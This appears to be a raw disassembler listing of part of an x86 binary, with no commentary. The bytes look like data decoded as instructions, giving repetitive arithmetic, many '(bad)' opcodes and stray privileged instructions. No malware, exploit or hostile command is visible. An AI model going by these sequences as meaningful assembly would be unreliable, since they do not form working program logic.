  41dc1d:	sbb    DWORD PTR [ecx],ebx
  41dc1f:	sbb    ebx,DWORD PTR [ebx]
  41dc21:	sbb    ebx,DWORD PTR [esp+ebx*1]
  41dc24:	sbb    al,0x1e
  41dc26:	sbb    al,0x2c
  41dc28:	sub    al,0x2c
  41dc2a:	sub    al,0x2f
  41dc2c:	push   ds
  41dc2d:	push   ds
  41dc2e:	sbb    al,0x1e
  41dc30:	sbb    ebx,DWORD PTR [edx]
  41dc32:	sbb    bl,BYTE PTR [ebx]
  41dc34:	sbb    al,0x1c
  41dc36:	sbb    ebx,DWORD PTR [eax]
  41dc38:	add    BYTE PTR [eax],bl
  41dc3a:	sbb    BYTE PTR [eax],bl
  41dc3c:	push   ss
  41dc3d:	sbb    DWORD PTR [ebx],ebx
  41dc3f:	sub    al,0x1c
  41dc41:	sbb    al,0x2c
  41dc43:	sub    eax,0x2c2c1e2d
  41dc48:	sub    al,0x2c
  41dc4a:	sub    al,0x34
  41dc4c:	xor    BYTE PTR ds:0x1e1e2c2c,ch
  41dc52:	push   ds
  41dc53:	sbb    al,0x1c
  41dc55:	sbb    al,0x1c
  41dc57:	sbb    al,0x16
  41dc59:	adc    al,0x18
  41dc5b:	sbb    bl,BYTE PTR [ecx]
  41dc5d:	sbb    bl,BYTE PTR [edx]
  41dc5f:	sbb    al,0x1b
  41dc61:	sbb    ebx,DWORD PTR [esp+ebx*1]
  41dc64:	sub    al,0x2c
  41dc66:	sub    al,0x2d
  41dc68:	das    
  41dc69:	das    
  41dc6a:	xor    BYTE PTR [edi+ebp*1],dh
  41dc6d:	sub    al,0x2d
  41dc6f:	sub    al,0x2c
  41dc71:	push   ds
  41dc72:	push   ds
  41dc73:	push   ds
  41dc74:	sbb    al,0x1b
  41dc76:	sbb    ebx,DWORD PTR [esi+edx*1]
  41dc79:	adc    dl,BYTE PTR [esi]
  41dc7b:	push   ss
  41dc7c:	sbb    BYTE PTR [ecx],bl
  41dc7e:	sbb    ebx,DWORD PTR [ebx]
  41dc80:	sbb    bl,BYTE PTR [esp+ebx*1]
  41dc83:	sbb    ebx,DWORD PTR [esi]
  41dc85:	sbb    al,0x1e
  41dc87:	sub    eax,0x3434342f
  41dc8c:	sub    eax,0x2c2c2c2c
  41dc91:	push   ds
  41dc92:	sbb    al,0x1b
  41dc94:	sbb    ebx,DWORD PTR [edx]
  41dc96:	sbb    ebx,DWORD PTR [ecx]
  41dc98:	sbb    BYTE PTR [ebx],dl
  41dc9a:	push   ss
  41dc9b:	sbb    DWORD PTR [eax],ebx
  41dc9d:	sbb    DWORD PTR [edx],ebx
  41dc9f:	sbb    ebx,DWORD PTR [ebx]
  41dca1:	sbb    DWORD PTR [edx],ebx
  41dca3:	sbb    al,0x1c
  41dca5:	push   ds
  41dca6:	sub    al,0x2f
  41dca8:	das    
  41dca9:	sub    eax,0x2d2f302f
  41dcae:	sub    al,0x2c
  41dcb0:	sub    al,0x2c
  41dcb2:	sbb    al,0x1a
  41dcb4:	sbb    ebx,DWORD PTR [ebx]
  41dcb6:	sbb    bl,BYTE PTR [ecx]
  41dcb8:	push   ss
  41dcb9:	adc    edx,DWORD PTR [esi]
  41dcbb:	push   ss
  41dcbc:	sbb    BYTE PTR [ecx],bl
  41dcbe:	sbb    DWORD PTR [ebx],ebx
  41dcc0:	sbb    al,0x1b
  41dcc2:	sbb    al,0x1e
  41dcc4:	push   ds
  41dcc5:	sub    al,0x2c
  41dcc7:	sub    al,0x2c
  41dcc9:	push   ds
  41dcca:	sub    al,0x2f
  41dccc:	sub    al,0x2d
  41dcce:	sub    al,0x1e
  41dcd0:	sbb    al,0x1c
  41dcd2:	sbb    ebx,DWORD PTR [ebx]
  41dcd4:	sbb    bl,BYTE PTR [ecx]
  41dcd6:	sbb    DWORD PTR [eax],ebx
  41dcd8:	adc    edx,DWORD PTR [ebx]
  41dcda:	push   ss
  41dcdb:	push   ss
  41dcdc:	sbb    BYTE PTR [eax],bl
  41dcde:	sbb    DWORD PTR [edx],ebx
  41dce0:	sbb    ebx,DWORD PTR [esp+ebx*1]
  41dce3:	sub    al,0x1e
  41dce5:	sub    al,0x1e
  41dce7:	sbb    al,0x1e
  41dce9:	push   ds
  41dcea:	sub    al,0x2c
  41dcec:	sub    al,0x2c
  41dcee:	sub    al,0x1e
  41dcf0:	sbb    al,0x1c
  41dcf2:	sbb    al,0x1a
  41dcf4:	sbb    DWORD PTR [ecx],ebx
  41dcf6:	sbb    DWORD PTR [eax],ebx
  41dcf8:	adc    edx,DWORD PTR [ebx]
  41dcfa:	push   ss
  41dcfb:	push   ss
  41dcfc:	push   ss
  41dcfd:	add    al,BYTE PTR [edx]
  41dcff:	add    DWORD PTR [edx],eax
  41dd01:	add    DWORD PTR [ecx],eax
  41dd03:	add    al,BYTE PTR [edx]
  41dd05:	add    al,BYTE PTR [ecx]
  41dd07:	add    DWORD PTR [edx],edx
  41dd09:	add    DWORD PTR [ecx],eax
  41dd0b:	add    DWORD PTR [ecx],eax
  41dd0d:	add    DWORD PTR [ecx],eax
  41dd0f:	add    DWORD PTR [ecx],eax
  41dd11:	add    DWORD PTR [ecx],eax
  41dd13:	add    DWORD PTR ds:0x13161818,eax
  41dd19:	adc    edx,DWORD PTR [esi]
  41dd1b:	adc    eax,DWORD PTR [ebx]
  41dd1d:	add    bl,ah
  41dd1f:	(bad)  
  41dd21:	dec    esi
  41dd22:	int3   
  41dd23:	(bad)  
  41dd25:	fcmovu st,st(4)
  41dd27:	add    DWORD PTR [ecx+eax*1],ebx
  41dd2a:	mov    ds:0xdedbdbde,al
  41dd2f:	int    0xd2
  41dd31:	loope  0x41dd11
  41dd33:	fadd   DWORD PTR [ecx]
  41dd35:	movhps xmm2,QWORD PTR [esi]
  41dd38:	adc    BYTE PTR [edx],dl
  41dd3a:	push   ss
  41dd3b:	or     al,0x2
  41dd3d:	fnsave [esi-0x46763949]
  41dd43:	mov    cl,0xb5
  41dd45:	rcl    ebx,0x1
  41dd48:	sbb    ebx,DWORD PTR [ecx]
  41dd4a:	add    bl,cl
  41dd4c:	rol    eax,0xaf
  41dd4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd50:	mov    edi,0xd6d7c2b8
  41dd55:	add    DWORD PTR [ebx],edx
  41dd57:	adc    edx,DWORD PTR [eax]
  41dd59:	add    BYTE PTR [eax],al
  41dd5b:	add    ch,bl
  41dd5d:	rol    esi,0xc4
  41dd60:	mov    ds:0xbeb5ca52,eax
  41dd65:	mov    esi,0x1c1a09d6
  41dd6a:	or     BYTE PTR [edx],al
  41dd6c:	aad    0xa6
  41dd6e:	mov    ah,0xad
  41dd70:	mov    edx,0xd0bdbdbe
  41dd75:	fild   DWORD PTR [ecx]
  41dd77:	adc    dl,BYTE PTR [eax]
  41dd79:	add    eax,esp
  41dd7b:	ffreep st(1)
  41dd7d:	(bad)  
  41dd7e:	leave  
  41dd7f:	leave  
  41dd80:	or     BYTE PTR [ecx-0x30354432],0xaa
  41dd87:	add    ebx,DWORD PTR [ebx]
  41dd89:	sbb    bl,BYTE PTR [ebx]
  41dd8b:	add    dl,cl
  41dd8d:	lods   al,BYTE PTR ds:[esi]
  41dd8e:	stos   BYTE PTR es:[edi],al
  41dd8f:	add    DWORD PTR [ebx],ecx
  41dd91:	push   ebx
  41dd92:	iret   
  41dd93:	enter  0xc7b3,0xd9
  41dd97:	add    DWORD PTR [edi],ecx
  41dd99:	add    edi,ebx
  41dd9b:	mov    al,0xc3
  41dd9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dda0:	add    al,BYTE PTR [edx]
  41dda2:	add    bh,BYTE PTR [edx+esi*4+0x1a0375ae]
  41dda9:	sbb    bl,BYTE PTR [ecx]
  41ddab:	add    cl,BYTE PTR [eax+0x18027eab]
  41ddb1:	add    DWORD PTR [ecx-0x44],edx
  41ddb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddb5:	cdq    
  41ddb6:	rcl    ah,1
  41ddb8:	add    DWORD PTR [ecx],eax
  41ddba:	int3   
  41ddbb:	shl    BYTE PTR [edx+0xc0288a4],0x13
  41ddc2:	push   ss
  41ddc3:	add    dh,BYTE PTR [ecx-0x66]
  41ddc6:	add    DWORD PTR [eax],0x2181816
  41ddcc:	imul   esp,DWORD PTR [ebp+0x7d],0x2131302
  41ddd3:	mov    eax,ds:0xa3a9689a
  41ddd8:	add    DWORD PTR [ecx],eax
  41ddda:	int3   
  41dddb:	test   al,0xad
  41dddd:	stos   DWORD PTR es:[edi],eax
  41ddde:	add    cl,BYTE PTR [eax]
  41dde0:	adc    dl,BYTE PTR [edx]
  41dde2:	adc    al,BYTE PTR [edx]
  41dde4:	add    DWORD PTR [esi+0x16160575],0x16
  41ddeb:	add    cl,BYTE PTR [edi+0x13027e4b]
  41ddf1:	adc    dl,BYTE PTR [eax]
  41ddf3:	add    DWORD PTR [edx+0x1a18264],ebx
  41ddf9:	add    DWORD PTR [edi],edi
  41ddfb:	mov    edi,DWORD PTR [eax-0x7a]
  41ddfe:	add    dl,BYTE PTR [eax]
  41de00:	adc    BYTE PTR [eax],dl
  41de02:	adc    al,BYTE PTR [edx]
  41de04:	cwde   
  41de05:	sbb    DWORD PTR [eax+0x1313130e],0x2
  41de0c:	outs   dx,DWORD PTR ds:[esi]
  41de0d:	js     0x41dd90
  41de0f:	add    dl,BYTE PTR [eax]
  41de11:	adc    dl,BYTE PTR [eax]
  41de13:	add    DWORD PTR [eax+0x69],ebp
  41de16:	data16 jge 0x41de1a
  41de19:	add    DWORD PTR [edi+ecx*4+0x6c],edx
  41de1d:	jae    0x41de21
  41de1f:	adc    BYTE PTR [edi],cl
  41de21:	add    al,BYTE PTR [ecx]
  41de23:	jl     0x41dda8
  41de25:	jg     0x41dda8
  41de27:	or     DWORD PTR [ebx],edx
  41de29:	adc    edx,DWORD PTR [ebx]
  41de2b:	add    cl,BYTE PTR [ecx+0x41]
  41de2e:	jne    0x41de32
  41de30:	adc    BYTE PTR [edx],dl
  41de32:	smsw   WORD PTR [edx+edi*2+0x42]
  41de37:	add    DWORD PTR [bx+di],eax
  41de3a:	pop    esp
  41de3b:	xchg   edi,eax
  41de3c:	test   BYTE PTR [ecx+0x2],bh
  41de3f:	(bad)  
  41de40:	lgdtd  [edx-0x6d6d6d6e]
  41de47:	adc    DWORD PTR [eax],edx
  41de49:	adc    dl,BYTE PTR [edx]
  41de4b:	add    bl,BYTE PTR [esi+0xf02356a]
  41de51:	adc    BYTE PTR [edi],cl
  41de53:	add    DWORD PTR [ecx+0x44],ecx
  41de56:	data16 jo 0x41de5a
  41de59:	add    DWORD PTR [ebp-0x7e],eax
  41de5c:	xchg   DWORD PTR [edx+0x1],esi
  41de5f:	or     al,0xc
  41de61:	add    eax,0x2020202
  41de66:	add    al,BYTE PTR [edx]
  41de68:	adc    BYTE PTR [eax],dl
  41de6a:	adc    BYTE PTR [edx],al
  41de6c:	ja     0x41dea9
  41de6e:	pop    ds
  41de6f:	add    cl,BYTE PTR [esp+ecx*1]
  41de72:	or     al,0x1
  41de74:	and    esp,DWORD PTR [eax]
  41de76:	inc    edi
  41de77:	pusha  
  41de78:	add    DWORD PTR [ecx],eax
  41de7a:	push   esp
  41de7b:	test   DWORD PTR [eax+0x8080172],eax
  41de81:	or     BYTE PTR [esp+ecx*1],cl
  41de84:	or     al,0xf
  41de86:	(bad)  
  41de87:	(bad)  
  41de88:	(bad)  
  41de89:	(bad)  
  41de8a:	lar    esi,WORD PTR [esi+0x36]
  41de8e:	and    eax,0x8080c02
  41de93:	add    ch,BYTE PTR [esi]
  41de95:	and    al,0x62
  41de97:	lea    eax,[ecx]
  41de99:	add    DWORD PTR [ebx+0x4c],ebx
  41de9c:	dec    edi
  41de9d:	jp     0x41de2d
  41de9f:	or     al,0x8
  41dea1:	add    eax,0xc0c0c08
  41dea6:	or     al,0xc
  41dea8:	or     al,0xc
  41deaa:	or     al,0x2
  41deac:	pop    ebp
  41dead:	aaa    
  41deae:	xor    eax,DWORD PTR [edx]
  41deb0:	or     BYTE PTR ds:0x2a7b0105,al
  41deb6:	dec    ebp
  41deb7:	pop    edx
  41deb8:	add    DWORD PTR [ecx],eax
  41deba:	push   esp
  41debb:	daa    
  41debc:	dec    esp
  41debd:	push   edi
  41debe:	outs   dx,BYTE PTR ds:[esi]
  41debf:	adc    eax,0x8080505
  41dec4:	add    eax,DWORD PTR [ecx]
  41dec6:	add    al,BYTE PTR [edx]
  41dec8:	or     al,0x8
  41deca:	or     BYTE PTR [edx],al
  41decc:	aas    
  41decd:	and    eax,DWORD PTR [edx+0x2]
  41ded0:	add    eax,0x701d0205
  41ded5:	cmp    dh,BYTE PTR [edx]
  41ded7:	xchg   edx,eax
  41ded8:	add    DWORD PTR [ecx],eax
  41deda:	pop    ebx
  41dedb:	cmp    al,0x44
  41dedd:	ds pop ecx
  41dedf:	xchg   edx,eax
  41dee0:	add    DWORD PTR [ecx],eax
  41dee2:	add    DWORD PTR [ecx],eax
  41dee4:	add    DWORD PTR [esp+edx*4+0x11],ebx
  41dee8:	push   cs
  41dee9:	or     BYTE PTR ds:0x6b376e02,al
  41deef:	xchg   edx,eax
  41def0:	add    DWORD PTR [ecx],eax
  41def2:	pop    esi
  41def3:	jb     0x41df38
  41def5:	inc    ebx
  41def6:	je     0x41de8a
  41def8:	add    DWORD PTR [ecx],eax
  41defa:	xchg   ebx,eax
  41defb:	pop    edi
  41defc:	push   ebp
  41defd:	pop    edx
  41defe:	xchg   edx,eax
  41deff:	cmp    eax,0x616c4470
  41df04:	dec    edx
  41df05:	ja     0x41de97
  41df07:	adc    al,0x7
  41df09:	add    BYTE PTR [ebx],al
  41df0b:	add    cl,BYTE PTR [edx+0x55469221]
  41df11:	pop    ecx
  41df12:	cmp    DWORD PTR [ecx+eiz*1],esp
  41df15:	dec    eax
  41df16:	xchg   edx,eax
  41df17:	add    DWORD PTR [eax],eax
  41df19:	add    BYTE PTR [ecx],al
  41df1b:	xchg   ebx,eax
  41df1c:	pop    edi
  41df1d:	mov    WORD PTR [edi],fs
  41df1f:	sub    BYTE PTR [ebx+0x3d],ah
  41df22:	dec    ebp
  41df23:	jb     0x41df70
  41df25:	cmp    BYTE PTR [eax+0x1000417],dl
  41df2b:	add    dl,BYTE PTR [edi-0x73]
  41df2e:	inc    edi
  41df2f:	and    BYTE PTR [eax+0x56],cl
  41df32:	sub    bh,BYTE PTR ds:0x29291
  41df38:	add    BYTE PTR [eax],al
  41df3a:	add    BYTE PTR [ecx],al
  41df3c:	xchg   ebp,eax
  41df3d:	jnp    0x41df7f
  41df3f:	sub    edi,DWORD PTR [edx]
  41df41:	cmp    ebp,DWORD PTR es:[ebp+0x23]
  41df45:	inc    ebx
  41df46:	nop
  41df47:	pop    ss
  41df48:	add    al,0x0
  41df4a:	add    DWORD PTR [esi+0x293c5860],ecx
  41df50:	xor    DWORD PTR [edx],ebp
  41df52:	push   eax
  41df53:	mov    al,ds:0x292
  41df58:	add    BYTE PTR [eax],al
  41df5a:	add    BYTE PTR [eax],al
  41df5c:	add    DWORD PTR [ebp-0x6464696a],edx
  41df62:	fwait
  41df63:	pushf  
  41df64:	popf   
  41df65:	popf   
  41df66:	lahf   
  41df67:	adc    DWORD PTR [ecx],eax
  41df69:	add    dl,BYTE PTR [edx-0x6d6d6d6e]
  41df6f:	xchg   edx,eax
  41df70:	xchg   edx,eax
  41df71:	xchg   edx,eax
  41df72:	xchg   edx,eax
  41df73:	xchg   edx,eax
  41df74:	add    DWORD PTR [eax],eax
  41df76:	add    BYTE PTR [eax],al
  41df78:	add    BYTE PTR [eax],al
  41df7a:	add    BYTE PTR [eax],al
  41df7c:	add    BYTE PTR [ecx],al
  41df7e:	add    DWORD PTR [ecx],eax
  41df80:	add    al,BYTE PTR [edx]
  41df82:	add    al,BYTE PTR [edx]
  41df84:	add    al,BYTE PTR [edx]
  41df86:	add    al,BYTE PTR [edx]
  41df88:	add    BYTE PTR [edx],al
  41df8a:	add    al,BYTE PTR [edx]
  41df8c:	add    al,BYTE PTR [edx]
  41df8e:	add    al,BYTE PTR [edx]
  41df90:	add    al,BYTE PTR [edx]
  41df92:	add    DWORD PTR [ecx],eax
	...
  41dfb8:	add    BYTE PTR [edx],cl
	...
  41dfd6:	add    BYTE PTR [eax],al
  41dfd8:	add    BYTE PTR [eax+eax*1],cl
	...
  41dff7:	add    BYTE PTR [eax+eax*1],cl
  41dffa:	or     al,0xc
	...
  41e014:	add    BYTE PTR [eax],al
  41e016:	or     cl,BYTE PTR [eax+eax*1]
  41e019:	add    BYTE PTR [eax],0x0
  41e01c:	add    DWORD PTR [eax],eax
	...
  41e092:	add    BYTE PTR [eax],al
  41e094:	add    BYTE PTR [eax+0x28010000],al
  41e09a:	add    BYTE PTR [eax],al
  41e09c:	add    BYTE PTR [eax],dl
  41e09e:	add    BYTE PTR [eax],al
  41e0a0:	add    BYTE PTR [eax],ah
  41e0a2:	add    BYTE PTR [eax],al
  41e0a4:	add    BYTE PTR [ecx],al
  41e0a6:	add    BYTE PTR [eax],cl
  41e0a8:	add    BYTE PTR [eax],al
  41e0aa:	add    BYTE PTR [eax],al
  41e0ac:	add    BYTE PTR [eax+0x1],al
	...
  41e0b7:	add    BYTE PTR [eax],al
  41e0b9:	add    BYTE PTR [ecx],al
	...
  41e0c3:	add    BYTE PTR [eax],al
  41e0c5:	add    al,BYTE PTR [edx]
  41e0c7:	add    eax,0x6050500
  41e0cc:	add    BYTE PTR [edx],cl
  41e0ce:	or     DWORD PTR [edi],eax
  41e0d0:	add    BYTE PTR [ebx],al
  41e0d2:	add    ecx,DWORD PTR [edx]
  41e0d4:	add    BYTE PTR [esp+eax*1],al
  41e0d7:	or     DWORD PTR [eax],eax
  41e0d9:	add    al,BYTE PTR [edx]
  41e0db:	or     al,0x0
  41e0dd:	push   es
  41e0de:	push   es
  41e0df:	or     al,0x0
  41e0e1:	pop    es
  41e0e2:	or     DWORD PTR ds:0x9090900,ecx
  41e0e8:	add    BYTE PTR [ebx],al
  41e0ea:	add    DWORD PTR [ebx],edx
  41e0ec:	add    BYTE PTR [esi],al
  41e0ee:	push   es
  41e0ef:	adc    BYTE PTR [eax],al
  41e0f1:	or     cl,BYTE PTR [edx]
  41e0f3:	adc    BYTE PTR [eax],al
  41e0f5:	or     DWORD PTR [ebx+edx*1],ecx
  41e0f8:	add    BYTE PTR [eax],al
  41e0fa:	add    BYTE PTR [eax],bl
  41e0fc:	add    BYTE PTR [ebx],al
  41e0fe:	add    al,0x18
  41e100:	add    BYTE PTR [esi],al
  41e102:	or     al,0x1c
  41e104:	add    BYTE PTR [edx],cl
  41e106:	adc    ebx,DWORD PTR [eax]
  41e108:	add    BYTE PTR [esi],dl
  41e10a:	adc    eax,0x16150015
  41e10f:	sbb    BYTE PTR [eax],al
  41e111:	add    DWORD PTR [ebx],eax
  41e113:	and    al,BYTE PTR [eax]
  41e115:	add    DWORD PTR [ebx],eax
  41e117:	and    eax,0x200a0900
  41e11c:	add    BYTE PTR [esi],al
  41e11e:	pop    es
  41e11f:	das    
  41e120:	add    BYTE PTR [ecx],al
  41e122:	add    esi,DWORD PTR [edx]
  41e124:	add    BYTE PTR [ebx],al
  41e126:	add    esi,DWORD PTR ds:0x360c0900
  41e12c:	add    BYTE PTR [edi],al
  41e12e:	or     bh,BYTE PTR [edi]
  41e130:	add    BYTE PTR [esi],al
  41e132:	push   es
  41e133:	inc    ebx
  41e134:	add    BYTE PTR [ebx],al
  41e136:	push   es
  41e137:	inc    edi
  41e138:	add    BYTE PTR [eax],al
  41e13a:	add    DWORD PTR [edx+0x0],ecx
  41e13d:	pop    es
  41e13e:	or     cl,BYTE PTR [edx+0x0]
  41e141:	push   es
  41e142:	adc    BYTE PTR [ebx+0x0],al
  41e145:	pop    es
  41e146:	adc    BYTE PTR [ebp+0x0],cl
  41e149:	add    BYTE PTR [ecx],al
  41e14b:	push   edx
  41e14c:	add    BYTE PTR [ecx],cl
  41e14e:	or     dl,BYTE PTR [eax+0x0]
  41e151:	add    DWORD PTR [ebx],eax
  41e153:	pop    esp
  41e154:	add    BYTE PTR [edx],cl
  41e156:	adc    BYTE PTR [eax+eax*1+0xf],dl
  41e15a:	sbb    eax,0x1519005d
  41e15f:	pop    esp
  41e160:	add    BYTE PTR [ebx],dl
  41e162:	and    dl,BYTE PTR [eax+eax*1+0x1]
  41e166:	push   es
  41e167:	pusha  
  41e168:	add    BYTE PTR [esi+eax*1],al
  41e16b:	popa   
  41e16c:	add    BYTE PTR [edi],al
  41e16e:	or     DWORD PTR [edx+0x0],esp
  41e171:	push   es
  41e172:	or     ch,BYTE PTR [eax+0x0]
  41e175:	movlps QWORD PTR [eax+0x0],xmm4
  41e179:	push   ss
  41e17a:	adc    eax,0x15150065
  41e17f:	outs   dx,DWORD PTR ds:[esi]
  41e180:	add    BYTE PTR [ecx],bl
  41e182:	pop    ds
  41e183:	ins    BYTE PTR es:[edi],dx
  41e184:	add    BYTE PTR [ecx],cl
  41e186:	or     al,0x73
  41e188:	add    BYTE PTR [edi+ecx*1],cl
  41e18b:	jb     0x41e18d
  41e18d:	push   es
  41e18e:	sbb    BYTE PTR [eax+eax*1+0x15],bh
  41e192:	sbb    BYTE PTR [ecx+0x0],bh
  41e195:	or     al,0x25
  41e197:	pusha  
  41e198:	add    BYTE PTR [eax],dl
  41e19a:	ss pusha 
  41e19c:	add    BYTE PTR [eax],al
  41e19e:	add    DWORD PTR [edx-0x73f60000],eax
  41e1a4:	add    BYTE PTR [edi],al
  41e1a6:	adc    eax,DWORD PTR [ebp-0x7aedf400]
  41e1ac:	add    BYTE PTR [edi],al
  41e1ae:	sbb    eax,0x19130087
  41e1b3:	add    DWORD PTR [eax],0x8b1910
  41e1b9:	pop    es
  41e1ba:	pop    es
  41e1bb:	xchg   esp,eax
  41e1bc:	add    BYTE PTR [edi],al
  41e1be:	or     bl,BYTE PTR [edx-0x6aedfd00]
  41e1c4:	add    BYTE PTR [ebx+edx*1],cl
  41e1c7:	xchg   esi,eax
  41e1c8:	add    BYTE PTR [ebx],dl
  41e1ca:	adc    eax,0x3215009a
  41e1cf:	test   DWORD PTR [eax],eax
  41e1d1:	(bad)  
  41e1d3:	xchg   ecx,eax
  41e1d4:	add    BYTE PTR ds:0xa009229,cl
  41e1da:	xor    BYTE PTR [ebx-0x64c2f000],dl
  41e1e0:	add    BYTE PTR [ecx],bl
  41e1e2:	aas    
  41e1e3:	sahf   
  41e1e4:	add    BYTE PTR [edx],cl
  41e1e6:	adc    BYTE PTR [eax+eax*1+0xbd1c18],ah
  41e1ed:	or     ah,BYTE PTR [eax]
  41e1ef:	mov    ds:0xa6512e00,eax
  41e1f4:	add    BYTE PTR [esp+eiz*2],bl
  41e1f7:	mov    eax,ds:0xb5692200
  41e1fc:	add    BYTE PTR [edx+0x73],cl
  41e1ff:	scas   eax,DWORD PTR es:[edi]
  41e200:	add    BYTE PTR [edx],ah
  41e202:	mov    ebx,edx
  41e204:	add    BYTE PTR [esi],ah
  41e206:	mov    esp,edx
  41e208:	add    BYTE PTR ds:0x5900d093,bh
  41e20e:	mov    ecx,0xa44d00c3
  41e213:	aam    0x0
  41e215:	inc    edx
  41e216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e217:	fadd   QWORD PTR [eax]
  41e219:	inc    esi
  41e21a:	cwde   
  41e21b:	loopne 0x41e21d
  41e21d:	push   esi
  41e21e:	mov    bl,0xe0
  41e220:	add    BYTE PTR [edx-0x47],ah
  41e223:	loop   0x41e225
  41e225:	push   0x7400e2b8
  41e22a:	mov    edx,0xe8bd00e4
  41e22f:	lock add BYTE PTR [eax-0x38ff0d14],bh
  41e236:	icebp  
  41e237:	test   BYTE PTR [eax],0xc1
  41e23a:	clc    
  41e23b:	inc    DWORD PTR [eax]
  41e23d:	(bad)  
  41e23e:	(bad)  
  41e23f:	inc    DWORD PTR [eax]
  41e241:	add    BYTE PTR [eax],al
  41e243:	add    BYTE PTR [eax],al
  41e245:	adc    al,0x2f
  41e247:	add    BYTE PTR [eax],al
  41e249:	and    dl,BYTE PTR [eax+0x0]
  41e24c:	add    BYTE PTR [eax],dh
  41e24e:	jo     0x41e250
  41e250:	add    BYTE PTR ds:0x4c000090,bh
  41e256:	mov    al,0x0
  41e258:	add    BYTE PTR [ecx-0x31],bl
  41e25b:	add    BYTE PTR [eax],al
  41e25d:	lock add BYTE PTR [bx+si],al
  41e261:	js     0x41e262
  41e263:	adc    DWORD PTR [eax],eax
  41e265:	mov    bh,bh
  41e267:	xor    DWORD PTR [eax],eax
  41e269:	pushf  
  41e26a:	call   DWORD PTR [ecx+0x0]
  41e26d:	scas   al,BYTE PTR es:[edi]
  41e26e:	push   DWORD PTR [ecx+0x0]
  41e271:	sar    bh,0x91
  41e274:	add    dl,dl
  41e276:	push   DWORD PTR [ecx-0x2e001c00]
  41e27c:	add    bh,bh
  41e27e:	(bad)  
  41e27f:	inc    DWORD PTR [eax]
  41e281:	add    BYTE PTR [eax],al
  41e283:	add    BYTE PTR [eax],al
  41e285:	es das 
  41e287:	add    BYTE PTR [eax],al
  41e289:	inc    eax
  41e28a:	push   eax
  41e28b:	add    BYTE PTR [eax],al
  41e28d:	pop    edx
  41e28e:	jo     0x41e290
  41e290:	add    BYTE PTR [eax+edx*4+0x0],dh
  41e294:	add    BYTE PTR [esi-0x56ffff50],cl
  41e29a:	iret   
  41e29b:	add    BYTE PTR [eax],al
  41e29d:	ret    0xf0
  41e2a0:	add    cl,dl
  41e2a2:	call   DWORD PTR [ecx]
  41e2a4:	add    al,bl
  41e2a6:	push   DWORD PTR [ecx]
  41e2a8:	add    dh,bl
  41e2aa:	call   DWORD PTR [ecx+0x0]
  41e2ad:	jecxz  0x41e2ae
  41e2af:	jno    0x41e2b1
  41e2b1:	jmp    0xef4274b5
  41e2b6:	push   DWORD PTR [ecx-0x2e000a00]
  41e2bc:	add    bh,bh
  41e2be:	(bad)  
  41e2bf:	inc    DWORD PTR [eax]
  41e2c1:	add    BYTE PTR [eax],al
  41e2c3:	add    BYTE PTR [eax],al
  41e2c5:	das    
  41e2c6:	add    BYTE PTR es:[eax],al
  41e2c9:	push   eax
  41e2ca:	inc    ecx
  41e2cb:	add    BYTE PTR [eax],al
  41e2cd:	jo     0x41e32a
  41e2cf:	add    BYTE PTR [eax],al
  41e2d1:	nop
  41e2d2:	je     0x41e2d4
  41e2d4:	add    BYTE PTR [eax-0x30ffff72],dh
  41e2da:	test   eax,0xc3f00000
  41e2df:	add    BYTE PTR [eax],al
  41e2e1:	call   edx
  41e2e3:	adc    DWORD PTR [eax],eax
  41e2e5:	(bad)  
  41e2e6:	fdiv   DWORD PTR [ecx]
  41e2e8:	add    bh,bh
  41e2ea:	fst    QWORD PTR [ecx+0x0]
  41e2ed:	jmp    esp
  41e2ef:	jno    0x41e2f1
  41e2f1:	(bad)  
  41e2f2:	jmp    0xb1:0xf0ff0091
  41e2f9:	push   esi
  41e2fb:	rol    DWORD PTR [eax],1
  41e2fd:	(bad)  
  41e2fe:	(bad)  
  41e2ff:	inc    DWORD PTR [eax]
  41e301:	add    BYTE PTR [eax],al
  41e303:	add    BYTE PTR [eax],al
  41e305:	das    
  41e306:	adc    al,0x0
  41e308:	add    BYTE PTR [eax+0x22],dl
  41e30b:	add    BYTE PTR [eax],al
  41e30d:	jo     0x41e33f
  41e30f:	add    BYTE PTR [eax],al
  41e311:	nop
  41e312:	add    BYTE PTR ds:[eax],al
  41e315:	mov    al,0x4d
  41e317:	add    BYTE PTR [eax],al
  41e319:	iret   
  41e31a:	pop    ebx
  41e31b:	add    BYTE PTR [eax],al
  41e31d:	lock imul eax,DWORD PTR [eax],0x1179ff00
  41e324:	add    bh,bh
  41e326:	mov    dh,BYTE PTR [ecx]
  41e328:	add    bh,bh
  41e32a:	popf   
  41e32b:	push   ecx
  41e32c:	add    bh,bh
  41e32e:	scas   eax,DWORD PTR es:[edi]
  41e32f:	jno    0x41e331
  41e331:	inc    ecx
  41e333:	xchg   ecx,eax
  41e334:	add    bh,bh
  41e336:	shl    BYTE PTR [ecx-0x2e1a0100],cl
  41e33c:	add    bh,bh
  41e33e:	(bad)  
  41e33f:	inc    DWORD PTR [eax]
  41e341:	add    BYTE PTR [eax],al
  41e343:	add    BYTE PTR [eax],al
  41e345:	das    
  41e346:	add    eax,DWORD PTR [eax]
  41e348:	add    BYTE PTR [eax+0x4],dl
  41e34b:	add    BYTE PTR [eax],al
  41e34d:	jo     0x41e355
  41e34f:	add    BYTE PTR [eax],al
  41e351:	nop
  41e352:	or     DWORD PTR [eax],eax
  41e354:	add    BYTE PTR [eax-0x30fffff6],dh
  41e35a:	or     al,0x0
  41e35c:	add    al,dh
  41e35e:	push   cs
  41e35f:	add    BYTE PTR [eax],al
  41e361:	jmp    DWORD PTR [eax]
  41e363:	adc    al,BYTE PTR [eax]
  41e365:	(bad)  
  41e366:	xor    DWORD PTR ds:[eax],eax
  41e369:	call   FWORD PTR [ecx+edx*2+0x0]
  41e36d:	(bad)  
  41e36e:	jp     0x41e3e1
  41e370:	add    bh,bh
  41e372:	xchg   edi,eax
  41e373:	xchg   ecx,eax
  41e374:	add    bh,bh
  41e376:	mov    dh,0xb1
  41e378:	add    bh,bh
  41e37a:	aam    0xd1
  41e37c:	add    bh,bh
  41e37e:	(bad)  
  41e37f:	inc    DWORD PTR [eax]
  41e381:	add    BYTE PTR [eax],al
  41e383:	add    BYTE PTR [eax],al
  41e385:	das    
